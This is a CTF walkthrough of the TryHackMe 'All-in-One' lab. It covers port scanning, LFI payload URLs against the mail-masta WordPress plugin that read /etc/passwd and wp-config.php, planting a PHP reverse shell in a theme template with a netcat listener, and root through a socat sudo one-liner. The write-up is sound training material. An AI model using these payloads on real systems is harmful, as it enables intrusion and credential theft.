# TryHackMe - All-in-One Walkthrough

This write-up covers the steps I took to complete the "[All-in-One](https://tryhackme.com/room/allinonemj)" room on TryHackMe.  
The machine focuses on WordPress exploitation, LFI, privilege escalation, and is a great challenge for anyone looking to sharpen their penetration testing skills.

Below you'll find the full process I followed — from enumeration to privilege escalation.

> ⚠️ This write-up contains spoilers. Proceed only if you've already tried the machine or are stuck.

# 1. Port Scanning
👁️ Using nmap:
```python
nmap -sC -sV -oN result 10.10.49.154
````
Result:
```python
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
````
# 2. FTP Enumeration
Anonymous login is allowed:
```python
ftp 10.10.49.154
````
However, no useful files were found.
# 3. Directory Enumeration (Gobuster)
```python
gobuster dir -u http://10.10.49.154 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
````
Interesting findings:
```python
/wordpress (301)
/index.html (200)
````
Re-scan on /wordpress:
```python
gobuster dir -u http://10.10.49.154/wordpress -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
````
Key files discovered:
```python
wp-login.php
wp-config.php
wp-mail.php (403)
xmlrpc.php, wp-cron.php, etc
````
# 4. LFI Exploitation via mail-masta Plugin
Researching leads to a known vulnerability:
```python
https://www.exploit-db.com/exploits/40290
````
Local File Inclusion (LFI) test:
```python
http://10.10.49.154/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
````
To read sensitive files like wp-config.php, we used Base64 encoding:
```python
http://10.10.49.154/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
````
Decoded Base64 output reveals:
```python
DB_USER: elyana  
DB_PASSWORD: ********
````
# 5. WordPress Login and Shell Upload
1 Login to /wp-login.php as user elyana

2 Navigate to Appearance > Theme Editor > 404.php

3 Upload a PHP reverse shell into the 404 template

Listener setup:
```python
nc -lvnp 4444
````
Trigger reverse shell:
```python
http://10.10.49.154/wordpress/wp-content/themes/twentytwenty/404.php
````
#  Privilege Escalation
We inspect config files:
```python
cd /etc/mysql/conf.d
cat private.txt
````
Found additional credentials:
```python
user: elyana
password: ********
````
SSH into the machine:
```python
ssh elyana@10.10.49.154
````
Retrieve the user flag:
```python
cat user.txt
````
# Root Privileges via socat
Check sudo rights:
```python
sudo -l
````
Output:
```python
(ALL) NOPASSWD: /usr/bin/socat
````

From GTFOBins:
```python
https://gtfobins.github.io/gtfobins/socat/
````
```python
sudo socat stdin exec:/bin/sh
````
Now root:
```python
whoami
root
cat /root/root.txt
````
 # <b>This was my first ever write-up, and I truly hope it was helpful to someone out there.  
Thanks for reading, and happy hacking!</b>
